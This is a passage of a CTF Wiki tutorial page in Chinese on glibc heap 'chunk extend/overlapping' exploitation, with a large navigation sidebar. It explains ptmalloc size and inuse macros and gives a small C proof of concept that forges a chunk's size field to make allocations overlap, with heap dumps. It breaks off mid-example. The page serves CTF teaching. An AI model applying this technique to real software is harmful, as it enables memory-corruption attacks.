                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/tcache-zh/" title="Tcache" class="md-nav__link">
                                              Tcache
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/malloc_state-zh/" title="malloc_state"
                                              class="md-nav__link">
                                              malloc_state
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/misc-zh/" title="Other" class="md-nav__link">
                                              Other
                                            </a>
                                          </li>


                                        </ul>
                                      </nav>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../heapoverflow_basic-zh/" title="Heap Overflow" class="md-nav__link">
                                        Heap Overflow
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../off_by_one-zh/" title="Heap-based Off-By-One" class="md-nav__link">
                                        Heap-based Off-By-One
                                      </a>
                                    </li>









                                    <li class="md-nav__item md-nav__item--active">

                                      <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox"
                                        id="__toc">




                                      <label class="md-nav__link md-nav__link--active" for="__toc">
                                        Chunk Extend/Overlapping
                                      </label>

                                      <a href="./" title="Chunk Extend/Overlapping"
                                        class="md-nav__link md-nav__link--active">
                                        Chunk Extend/Overlapping
                                      </a>


                                      <nav class="md-nav md-nav--secondary">





                                        <label class="md-nav__title" for="__toc">目录</label>
                                        <ul class="md-nav__list" data-md-scrollfix>

                                          <li class="md-nav__item">
                                            <a href="#_1" class="md-nav__link">
                                              介绍
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#_2" class="md-nav__link">
                                              原理
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#1inusefastbinextend" class="md-nav__link">
                                              基本示例1：对inuse的fastbin进行extend
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#2inusesmallbinextend" class="md-nav__link">
                                              基本示例2：对inuse的smallbin进行extend
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#3freesmallbinextend" class="md-nav__link">
                                              基本示例3：对free的smallbin进行extend
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#chunk-extendshrink" class="md-nav__link">
                                              Chunk Extend/Shrink 可以做什么
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#4extendoverlapping" class="md-nav__link">
                                              基本示例4：通过extend后向overlapping
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#5extendoverlapping" class="md-nav__link">
                                              基本示例5：通过extend前向overlapping
                                            </a>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#hitcon-trainging-lab13" class="md-nav__link">
                                              HITCON Trainging lab13
                                            </a>

                                            <nav class="md-nav">
                                              <ul class="md-nav__list">

                                                <li class="md-nav__item">
                                                  <a href="#_3" class="md-nav__link">
                                                    基本信息
                                                  </a>

                                                </li>

                                                <li class="md-nav__item">
                                                  <a href="#_4" class="md-nav__link">
                                                    基本功能
                                                  </a>

                                                </li>

                                                <li class="md-nav__item">
                                                  <a href="#_5" class="md-nav__link">
                                                    利用
                                                  </a>

                                                </li>

                                              </ul>
                                            </nav>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#2015-hacklu-bookstore" class="md-nav__link">
                                              2015 hacklu bookstore
                                            </a>

                                            <nav class="md-nav">
                                              <ul class="md-nav__list">

                                                <li class="md-nav__item">
                                                  <a href="#_6" class="md-nav__link">
                                                    基本信息
                                                  </a>

                                                </li>

                                                <li class="md-nav__item">
                                                  <a href="#_7" class="md-nav__link">
                                                    基本功能
                                                  </a>

                                                </li>

                                                <li class="md-nav__item">
                                                  <a href="#_8" class="md-nav__link">
                                                    利用思路
                                                  </a>

                                                </li>

                                              </ul>
                                            </nav>

                                          </li>

                                          <li class="md-nav__item">
                                            <a href="#_9" class="md-nav__link">
                                              题目
                                            </a>

                                          </li>





                                          <li class="md-nav__item">
                                            <a href="#__comments" class="md-nav__link md-nav__link--active">
                                              评论
                                            </a>
                                          </li>

                                        </ul>

                                      </nav>

                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../unlink-zh/" title="Unlink" class="md-nav__link">
                                        Unlink
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../use_after_free-zh/" title="Use After Free" class="md-nav__link">
                                        Use After Free
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../fastbin_attack-zh/" title="Fastbin Attack" class="md-nav__link">
                                        Fastbin Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../unsorted_bin_attack-zh/" title="Unsorted Bin Attack"
                                        class="md-nav__link">
                                        Unsorted Bin Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../large_bin_attack-zh/" title="Large Bin Attack" class="md-nav__link">
                                        Large Bin Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../tcache_attack-zh/" title="Tcache Attack" class="md-nav__link">
                                        Tcache Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_einherjar-zh/" title="House of Einherjar"
                                        class="md-nav__link">
                                        House of Einherjar
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_force-zh/" title="House of Force" class="md-nav__link">
                                        House of Force
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_lore-zh/" title="House of Lore" class="md-nav__link">
                                        House of Lore
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_orange-zh/" title="House of Orange" class="md-nav__link">
                                        House of Orange
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_rabbit-zh/" title="House of Rabbit" class="md-nav__link">
                                        House of Rabbit
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../house_of_roman-zh/" title="House of Roman" class="md-nav__link">
                                        House of Roman
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-5" type="checkbox"
                                  id="nav-8-2-5">

                                <label class="md-nav__link" for="nav-8-2-5">
                                  IO_FILE Related
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-5">
                                    IO_FILE Related
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../io_file/introduction-zh/" title="FILE Structure Description"
                                        class="md-nav__link">
                                        FILE Structure Description
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../io_file/fake-vtable-exploit-zh/"
                                        title="Forged Vtable to Hijack Control Flow" class="md-nav__link">
                                        Forged Vtable to Hijack Control Flow
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../io_file/fsop-zh/" title="FSOP" class="md-nav__link">
                                        FSOP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../io_file/exploit-in-libc2.24-zh/"
                                        title="Use of IO_FILE Under Glibc 2.24" class="md-nav__link">
                                        Use of IO_FILE Under Glibc 2.24
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-6" type="checkbox"
                                  id="nav-8-2-6">

                                <label class="md-nav__link" for="nav-8-2-6">
                                  Race Condition
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-6">
                                    Race Condition
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../race-condition/introduction-zh/"
                                        title="Race Condition Introduction" class="md-nav__link">
                                        Race Condition Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../race-condition/problem-zh/" title="Example" class="md-nav__link">
                                        Example
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-7" type="checkbox"
                                  id="nav-8-2-7">

                                <label class="md-nav__link" for="nav-8-2-7">
                                  Integer Overflow
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-7">
                                    Integer Overflow
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../integeroverflow/intof-zh/"
                                        title="Introduction to The Principle of Integer Overflow" class="md-nav__link">
                                        Introduction to The Principle of Integer Overflow
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-8" type="checkbox"
                                  id="nav-8-2-8">

                                <label class="md-nav__link" for="nav-8-2-8">
                                  Sandbox Escape
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-8">
                                    Sandbox Escape
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../sandbox/python-sandbox-escape-zh/" title="Python Sandbox Escape"
                                        class="md-nav__link">
                                        Python Sandbox Escape
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-9" type="checkbox"
                                  id="nav-8-2-9">

                                <label class="md-nav__link" for="nav-8-2-9">
                                  Linux Kernel
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-9">
                                    Linux Kernel
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/environment-zh/" title="Environment Setup"
                                        class="md-nav__link">
                                        Environment Setup
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/basic_knowledge-zh/" title="Basics" class="md-nav__link">
                                        Basics
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/kernel_uaf-zh/" title="Kernel-UAF" class="md-nav__link">
                                        Kernel-UAF
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/kernel_rop-zh/" title="Kernel-ROP" class="md-nav__link">
                                        Kernel-ROP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/ret2usr-zh/" title="ret2usr" class="md-nav__link">
                                        ret2usr
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/bypass_smep-zh/" title="bypass-smep" class="md-nav__link">
                                        bypass-smep
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../kernel/double-fetch-zh/" title="Double Fetch" class="md-nav__link">
                                        Double Fetch
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-10" type="checkbox"
                                  id="nav-8-2-10">

                                <label class="md-nav__link" for="nav-8-2-10">
                                  arm-pwn
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-10">
                                    arm-pwn
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../arm/environment-zh/" title="Environment Setup"
                                        class="md-nav__link">
                                        Environment Setup
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../arm/arm_rop-zh/" title="arm-rop" class="md-nav__link">
                                        arm-rop
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-11" type="checkbox"
                                  id="nav-8-2-11">

                                <label class="md-nav__link" for="nav-8-2-11">
                                  Summary
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-11">
                                    Summary
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../summary/get-address-zh/" title="Address Leaking"
                                        class="md-nav__link">
                                        Address Leaking
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../summary/hijack-control-flow-zh/" title="Hijack Control Flow"
                                        class="md-nav__link">
                                        Hijack Control Flow
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../summary/get-shell-zh/" title="Get Shell" class="md-nav__link">
                                        Get Shell
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">

                          <label class="md-nav__link" for="nav-8-3">
                            Windows Pwn
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-8-3">
                              Windows Pwn
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../windows/readme-zh/" title="Overview" class="md-nav__link">
                                  Overview
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3-2" type="checkbox"
                                  id="nav-8-3-2">

                                <label class="md-nav__link" for="nav-8-3-2">
                                  Stack Overflow
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-3-2">
                                    Stack Overflow
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../windows/stackoverflow/stack-introduce-zh/"
                                        title="Stack Introduction" class="md-nav__link">
                                        Stack Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/"
                                        title="Stack Overflow Principle" class="md-nav__link">
                                        Stack Overflow Principle
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/"
                                        title="shellcode-in-stack" class="md-nav__link">
                                        shellcode-in-stack
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">

                    <label class="md-nav__link" for="nav-9">
                      Android
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-9">
                        Android
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../android/basic_develop/basic_develop-zh/"
                            title="Android Development Basics" class="md-nav__link">
                            Android Development Basics
                          </a>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">

                          <label class="md-nav__link" for="nav-9-2">
                            Android Application Operating Mechanism Brief
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-9-2">
                              Android Application Operating Mechanism Brief
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../android/basic_operating_mechanism/readme-zh/" title="Basics"
                                  class="md-nav__link">
                                  Basics
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2" type="checkbox"
                                  id="nav-9-2-2">

                                <label class="md-nav__link" for="nav-9-2-2">
                                  The Operating Mechanism of the Java Layer in Android
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-9-2-2">
                                    The Operating Mechanism of the Java Layer in Android
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/"
                                        title="Andriod Native" class="md-nav__link">
                                        Andriod Native
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/"
                                        title="Smali Introduction" class="md-nav__link">
                                        Smali Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item md-nav__item--nested">

                                      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2-3"
                                        type="checkbox" id="nav-9-2-2-3">

                                      <label class="md-nav__link" for="nav-9-2-2-3">
                                        Dex and ODEX
                                      </label>
                                      <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
                                        <label class="md-nav__title" for="nav-9-2-2-3">
                                          Dex and ODEX
                                        </label>
                                        <ul class="md-nav__list" data-md-scrollfix>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/"
                                              title="DEX" class="md-nav__link">
                                              DEX
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/"
                                              title="ODEX" class="md-nav__link">
                                              ODEX
                                            </a>
                                          </li>


                                        </ul>
                                      </nav>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-3" type="checkbox"
                                  id="nav-9-2-3">

                                <label class="md-nav__link" for="nav-9-2-3">
                                  Android Native Layer Introduction
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-9-2-3">
                                    Android Native Layer Introduction
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/"
                                        title="Android SO" class="md-nav__link">
                                        Android SO
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4" type="checkbox"
                                  id="nav-9-2-4">

                                <label class="md-nav__link" for="nav-9-2-4">
                                  Android Reverse Basic Introduction
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-9-2-4">
                                    Android Reverse Basic Introduction
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../android/basic_reverse/overview-zh/" title="Brief Description"
                                        class="md-nav__link">
                                        Brief Description
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../android/basic_reverse/android_code_location-zh/"
                                        title="Android Key Part Location" class="md-nav__link">
                                        Android Key Part Location
                                      </a>
                                    </li>







                                    <li class="md-nav__item md-nav__item--nested">

                                      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-3"
                                        type="checkbox" id="nav-9-2-4-3">

                                      <label class="md-nav__link" for="nav-9-2-4-3">
                                        Android Simple Static Analysis
                                      </label>
                                      <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
                                        <label class="md-nav__title" for="nav-9-2-4-3">
                                          Android Simple Static Analysis
                                        </label>
                                        <ul class="md-nav__list" data-md-scrollfix>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_reverse/static/java-example-zh/"
                                              title="Android Java Layer Static Analysis" class="md-nav__link">
                                              Android Java Layer Static Analysis
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_reverse/static/so-example-zh/"
                                              title="Android Native Layer Static Analysis" class="md-nav__link">
                                              Android Native Layer Static Analysis
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_reverse/static/complex-example-zh/"
                                              title="Android Static Analysis Hybrid Example" class="md-nav__link">
                                              Android Static Analysis Hybrid Example
                                            </a>
                                          </li>


                                        </ul>
                                      </nav>
                                    </li>







                                    <li class="md-nav__item md-nav__item--nested">

                                      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-4"
                                        type="checkbox" id="nav-9-2-4-4">

                                      <label class="md-nav__link" for="nav-9-2-4-4">
                                        Android Simple Dynamic Analysis
                                      </label>
                                      <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
                                        <label class="md-nav__title" for="nav-9-2-4-4">
                                          Android Simple Dynamic Analysis
                                        </label>
                                        <ul class="md-nav__list" data-md-scrollfix>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/"
                                              title="Dynamic Debugging" class="md-nav__link">
                                              Dynamic Debugging
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/"
                                              title="Android Dynamic Debugging SO" class="md-nav__link">
                                              Android Dynamic Debugging SO
                                            </a>
                                          </li>


                                        </ul>
                                      </nav>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">

                    <label class="md-nav__link" for="nav-10">
                      ICS
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-10">
                        ICS
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../ics/ctfs-zh/" title="ICS_CTF Contest" class="md-nav__link">
                            ICS_CTF Contest
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../ics/discover-zh/" title="ICS_CTF found" class="md-nav__link">
                            ICS_CTF found
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../ics/exploit-zh/" title="ICS_CTF uses" class="md-nav__link">
                            ICS_CTF uses
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../ics/learn-zh/" title="ICS_CTF Learning Resources" class="md-nav__link">
                            ICS_CTF Learning Resources
                          </a>
                        </li>


                      </ul>
                    </nav>
                  </li>


                </ul>
              </nav>
            </div>
          </div>
        </div>


        <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
          <div class="md-sidebar__scrollwrap">
            <div class="md-sidebar__inner">

              <nav class="md-nav md-nav--secondary">





                <label class="md-nav__title" for="__toc">目录</label>
                <ul class="md-nav__list" data-md-scrollfix>

                  <li class="md-nav__item">
                    <a href="#_1" class="md-nav__link">
                      介绍
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#_2" class="md-nav__link">
                      原理
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#1inusefastbinextend" class="md-nav__link">
                      基本示例1：对inuse的fastbin进行extend
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#2inusesmallbinextend" class="md-nav__link">
                      基本示例2：对inuse的smallbin进行extend
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#3freesmallbinextend" class="md-nav__link">
                      基本示例3：对free的smallbin进行extend
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#chunk-extendshrink" class="md-nav__link">
                      Chunk Extend/Shrink 可以做什么
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#4extendoverlapping" class="md-nav__link">
                      基本示例4：通过extend后向overlapping
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#5extendoverlapping" class="md-nav__link">
                      基本示例5：通过extend前向overlapping
                    </a>

                  </li>

                  <li class="md-nav__item">
                    <a href="#hitcon-trainging-lab13" class="md-nav__link">
                      HITCON Trainging lab13
                    </a>

                    <nav class="md-nav">
                      <ul class="md-nav__list">

                        <li class="md-nav__item">
                          <a href="#_3" class="md-nav__link">
                            基本信息
                          </a>

                        </li>

                        <li class="md-nav__item">
                          <a href="#_4" class="md-nav__link">
                            基本功能
                          </a>

                        </li>

                        <li class="md-nav__item">
                          <a href="#_5" class="md-nav__link">
                            利用
                          </a>

                        </li>

                      </ul>
                    </nav>

                  </li>

                  <li class="md-nav__item">
                    <a href="#2015-hacklu-bookstore" class="md-nav__link">
                      2015 hacklu bookstore
                    </a>

                    <nav class="md-nav">
                      <ul class="md-nav__list">

                        <li class="md-nav__item">
                          <a href="#_6" class="md-nav__link">
                            基本信息
                          </a>

                        </li>

                        <li class="md-nav__item">
                          <a href="#_7" class="md-nav__link">
                            基本功能
                          </a>

                        </li>

                        <li class="md-nav__item">
                          <a href="#_8" class="md-nav__link">
                            利用思路
                          </a>

                        </li>

                      </ul>
                    </nav>

                  </li>

                  <li class="md-nav__item">
                    <a href="#_9" class="md-nav__link">
                      题目
                    </a>

                  </li>





                  <li class="md-nav__item">
                    <a href="#__comments" class="md-nav__link md-nav__link--active">
                      评论
                    </a>
                  </li>

                </ul>

              </nav>
            </div>
          </div>
        </div>


        <div class="md-content">
          <article class="md-content__inner md-typeset">


            <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/chunk_extend_overlapping-zh.md"
              title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>


            <p><a href="../chunk_extend_overlapping/">EN</a> | <a href="./">ZH</a></p>
            <h1 id="chunk-extend-and-overlapping">Chunk Extend and Overlapping<a class="headerlink"
                href="#chunk-extend-and-overlapping" title="Permanent link">&para;</a></h1>
            <h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
            <p>chunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping的效果。这种利用方法需要以下的时机和条件：</p>
            <ul>
              <li>程序中存在基于堆的漏洞</li>
              <li>漏洞可以控制 chunk header 中的数据</li>
            </ul>
            <h2 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
            <p>chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏。</p>
            <p>在ptmalloc中，获取 chunk 块大小的操作如下
              <div class="codehilite">
                <pre><span></span><code>/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)-&gt;mchunk_size)
</code></pre>
              </div>
              一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
            <p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下
              <div class="codehilite">
                <pre><span></span><code>/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
</code></pre>
              </div>
              即使用当前块指针加上当前块大小。</p>
            <p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下
              <div class="codehilite">
                <pre><span></span><code>/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)-&gt;mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
</code></pre>
              </div>
              即通过malloc_chunk-&gt;prev_size获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
            <p>在 ptmalloc，判断当前 chunk 是否是use状态的操作如下：
              <div class="codehilite">
                <pre><span></span><code>#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)
</code></pre>
              </div>
              即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
            <p>更多的操作详见 <code>堆相关数据结构</code> 一节。</p>
            <p>通过上面几个宏可以看出，ptmalloc通过chunk header的数据判断chunk的使用情况和对chunk的前后块进行定位。简而言之，chunk
              extend就是通过控制size和pre_size域来实现跨越块操作从而导致overlapping的。</p>
            <p>与chunk extend类似的还有一种称为chunk shrink的操作。这里只介绍chunk extend的利用。</p>
            <h2 id="1inusefastbinextend">基本示例1：对inuse的fastbin进行extend<a class="headerlink" href="#1inusefastbinextend"
                title="Permanent link">&para;</a></h2>
            <p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。
              <strong>注意，我们的示例都是在64位的程序。如果想在32位下进行测试，可以把8字节偏移改为4字节</strong>。
              <div class="codehilite">
                <pre><span></span><code>int main(void)
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第一个0x10的chunk
    malloc(0x10);//分配第二个0x10的chunk

    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
}
</code></pre>
              </div>
              当两个malloc语句执行之后，堆的内存分布如下
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk
</code></pre>
              </div>
              之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header
              的大小。如上所示正好大小为0x40。在题目中这一步可以由堆溢出得到。
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小
0x602010:   0x0000000000000000  0x0000000000000000
